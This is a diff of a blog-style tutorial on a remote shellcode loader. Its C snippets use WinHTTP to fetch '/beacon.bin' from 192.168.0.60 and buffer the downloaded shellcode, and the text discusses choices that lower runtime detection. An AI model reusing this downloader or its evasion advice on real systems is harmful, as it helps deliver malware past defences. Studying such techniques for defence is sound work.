@@ -31,29 +31,28 @@ On the photo below, there is a comparison between a traditional XORed encrypted 
 
 The full source code can be found [here](https://github.com/kleiton0x00/RemoteShellcodeExec/), but on this article I will try to break down the code for the sake of understanding.
 
-In order to request the shellcode from the HTTP Server, I will be using  `winhttp` library. Alternatively you can use sockets, based on some researches it might be a better solution which might results on lower runtime detection. The code below is a basic one (it's shorten for understanding purposes) for requesting and retrieving the HTTP Response body of the request (which is the raw shellcode), which basically is going to be stored on a vectored array:
+In order to request the shellcode from the HTTP Server, I will be using  `winhttp` library. Alternatively you can use sockets, based on some researches it might be a better solution which might results on lower runtime detection (as probably the Winsocket's API will get hooked). The code below is responsible for sending an HTTP request to the remote server and waiting for the response:
 
 ```c
     // Initialize WinHTTP 
     hInternet = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    printf("[+] WinHTTP initialized\n");
 
     // Connect to the HTTP server 
     hHttpSession = WinHttpConnect(hInternet, L"192.168.0.60", 80, 0); //192.168.0.60:8081
-    printf("[+] Connected to HTTP Server\n");
 
     // Open an HTTP request 
     hHttpRequest = WinHttpOpenRequest(hHttpSession, L"GET", L"/beacon.bin", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-    printf("[+] Sending HTTP GET Request\n");
 
     // Send a request 
     bResults = WinHttpSendRequest(hHttpRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
-    printf("[+] WinHTTP request sent\n");
 
     // Wait for the response 
     bResults = WinHttpReceiveResponse(hHttpRequest, NULL);
-    printf("[+] Response retrieved\n");
+```
 
+WinHTTP receives the response in chunks, so we need to make a loop untill everything is retrieved:
+
+```c
     do
     {
         dwSize = 0;
@@ -81,21 +80,15 @@ In order to request the shellcode from the HTTP Server, I will be using  `winhtt
             PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
 
     } while (dwSize > 0);
+```
 
+Lastly, make sure to store each chunk in a vectored array:  
 
+```c
     char* PE = (char*)malloc(PEbuf.size());
     for (int i = 0; i < PEbuf.size(); i++) {
         PE[i] = PEbuf[i];
     }
-
-    // Close the HTTP request 
-    WinHttpCloseHandle(hHttpRequest);
-
-    // Close the session 
-    WinHttpCloseHandle(hHttpSession);
-
-    // Cleanup 
-    WinHttpCloseHandle(hInternet);
 ```
 
 ## There is always place for encryption
